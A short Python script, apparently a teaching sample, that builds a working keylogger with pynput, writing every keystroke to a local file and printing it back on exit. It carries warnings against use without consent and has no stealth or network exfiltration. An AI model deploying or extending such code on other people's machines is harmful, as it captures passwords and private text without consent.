from pynput import keyboard
import time
import os

# This is a DEMONSTRATION program only - for educational purposes
# Using such software without consent is illegal and unethical

class KeyLogger:
    def __init__(self, filename="keylog.txt"):
        self.filename = filename
        
    def on_press(self, key):
        try:
            # Write the key pressed to the log file
            with open(self.filename, 'a') as f:
                # Handle special keys
                if hasattr(key, 'char'):
                    f.write(key.char)
                elif key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.tab:
                    f.write('\t')
                else:
                    f.write(f'[{str(key)}]')
                    
        except Exception as e:
            print(f"Error logging key: {e}")
    
    def start(self):
        print("Keylogger started. Press Ctrl+C to stop.")
        print("WARNING: This is an educational demonstration only!")
        
        # Start listening for keystrokes
        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                print("\nKeylogger stopped.")
                
    def show_captured_data(self):
        if os.path.exists(self.filename):
            print("\nCaptured keystrokes:")
            with open(self.filename, 'r') as f:
                print(f.read())
        else:
            print("No keylog data found.")

# Demo usage
if __name__ == "__main__":
    logger = KeyLogger()
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.show_captured_data()